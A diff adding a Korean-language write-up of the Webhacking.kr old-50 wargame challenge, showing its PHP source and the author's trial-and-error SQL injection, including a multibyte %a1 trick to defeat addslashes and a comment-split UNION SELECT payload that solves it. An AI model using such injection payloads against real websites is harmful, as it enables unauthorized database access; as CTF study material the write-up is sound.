@@ -148,15 +148,85 @@ elseif($data[0]==2){
 
 -----
 
-<br><br><br>
-
------
-
 # > Webhacking.kr:old-50
 
 ## 삽질
 
 점수에 쫄아서 다음꺼부터!
+
+'22.06.27
+{: .text-red-000}
+
+```php
+<?php
+  if($_GET['id'] && $_GET['pw']){
+    $db = dbconnect();
+    $_GET['id'] = addslashes($_GET['id']); 
+    $_GET['pw'] = addslashes($_GET['pw']);
+    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
+    foreach($_GET as $ck) if(preg_match("/from|pw|\(|\)| |%|=|>|</i",$ck)) exit();
+    if(preg_match("/union/i",$_GET['id'])) exit();
+    $result = mysqli_fetch_array(mysqli_query($db,"select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
+    if($result){
+      if($result['lv']==1) echo("level : 1<br><br>");
+      if($result['lv']==2) echo("level : 2<br><br>");
+    } 
+    if($result['lv']=="3") solve(50);
+    if(!$result) echo("Wrong");
+  }
+?>
+```
+
+풀려면 쿼리의 결과가 "3"이 나오도록 만들면 되는 문제인데, 필터링이 꽤 있어보인다.
+
+`mb_convert_encoding` 함수를 몰라서 인터넷에 쳐봤는데 왠걸? 이 함수의 취약점이 연관검색어로 떴다. 이 부분을 이용하는 듯하니 확인해보았다.
+
+한글과 같이 멀티바이트(2바이트)를 사용하는 언어셋 환경에서 백슬래시 앞에 %a1~%fe의 값이 들어오면 백슬래시를 먹은 채 하나의 문자(1바이트)로 인식한다고 한다. 즉, `addslash`와 같은 함수로 인해 추가된 백슬래쉬를 이 취약점을 통해 먹어서 없애버릴 수 있다.
+
+음 근데 `%` 기호가 막혀있다. 
+
+음 근데 `mb_conver_encoding` 함수 이후니까 문제없을 지도? ㅋㅋㅋ
+
+```
+'|| lv='3'#
+=> %a1%27||%09lv%09like%09%bf%273%bf%27%23
+```
+
+`#` 기호를 url 창에 넣으면 안되서 '%23'으로 대체하였다. lv 값이 3인 결과를 가져올 수 있도록 이렇게 전달을 했는데, "Wrong"이 출력되었다.
+
+이 말이 무엇이냐, 대충 이러한 방식으로 풀면 되는 것인데, 머리를 좀 더 써야 한다. `union` 구문을 필터링 했지만 'union select 3#' 을 이용하지 않으면 가능성이 보이지 않는다. union을 쓸려면 `md()`로 감싸진 것을 풀어헤쳐야 하는데...
+
+lv 값을 구하는 시도 이후에 쿼터와 같은 기호를 `addslashes()`  피하면서 넣을 수 있는 방법을 알았다. 그럼 없애고 싶은 부분을 주석 처리를 해보면 어떤가. 한 줄 자체를 주석처리 하는 것은 `#` 기호 뒤이고, 부분적으로는 `/**/` 이 있다. 그리고 나는 id와 pw란에 각각 값을 넣으니, 중간에 사라졌으면 하는 `md5()`를 없애버린다면,,,?
+
+```
+id=/*
+pw=*/' union select 3#
+=> %2f%2a
+=> %2a%2f%a1%27%%09union%09select%093%23
+id=%2f%2a&pw=%2a%2f%a1%27%09union%09select%093%23
+```
+
+아니 어째서인지 안된다
+
+```php
+"select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"
+=> "select lv from chall50 where id='/*' and pw=md5('*/'union select 3#')"
+=> "select lv from chall50 where id='/**/'union select 3#')"
+```
+
+이 방법 외에 진짜 모르겠어서 답지를 찔끔만 볼려고 했는데, 
+
+```
+id='/*
+pw=*/ union select 3#
+id=%a1%27%2f%2a&pw=%2a%2f%09union%09select%093%23
+```
+
+전자처럼 해버리면 `'  '` 사이에 `/**/` 기호가 문자열 자체로 인식되서 "Wrong"이 뜨는 듯하다.
+
+3일 걸린 게 웃기다 ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+
+![image-20220629220531070](../img/image-20220629220531070.png)
 
 <br><br><br>
 
